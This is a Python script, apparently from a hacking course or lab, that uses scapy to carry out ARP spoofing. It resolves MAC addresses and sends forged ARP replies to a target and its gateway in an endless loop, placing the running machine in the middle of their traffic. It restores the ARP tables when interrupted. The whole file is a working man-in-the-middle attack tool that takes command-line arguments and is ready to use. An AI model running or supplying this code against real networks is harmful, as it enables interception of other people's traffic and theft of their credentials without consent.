import scapy.all as scapy
import time
import sys
import optparse

# get_mac returns the MAC address of the IP you wish to spoof
def get_mac(ip):
    # create packet
    # create ARP request asking who has IP address in a specific IP address range
    arp_request = scapy.ARP(pdst = ip)
    #  set the destination MAC to the broadcast MAC address to make sure request is sent to all clients on network
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    # variable that stores packet to be sent across network
    arp_request_broadcast = broadcast/arp_request
    # send packet, return and store answered responses in variable (srp = send and receive packet)
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


# op = 2 (to send ARP response), pdst = target IP, hwdst = target MAC address, psrc = spoofing router
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst = target_ip, hwdst=target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

# restore() will create an ARP response nearly identical to the spoof() except we manually set the hwsrc
# (source MAC) to the MAC address of the source IP to restore original ARP table and end the spoof


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst = destination_ip, hwdst = destination_mac, psrc=source_ip, hwsrc = source_mac)
    scapy.send(packet, count = 4, verbose = False)


def get_ips():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP address")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway (router) IP address")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target IP address use -t")
    if not options.gateway:
        parser.error("[-] Please specify a gateway (router) IP address use -g")
    return options


options = get_ips()
target_ip = options.target #"10.0.2.4" target IP
gateway_ip = options.gateway #"10.0.2.1" IP of router

# continue spoofing until ctrl^c is pressed on terminal
sent_packets_count = 0
try:

    while True:
        # this line spoofs the client
        spoof(target_ip, gateway_ip)
        # this line spoofs the router
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C... Resetting ARP table... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] ARP table restored")

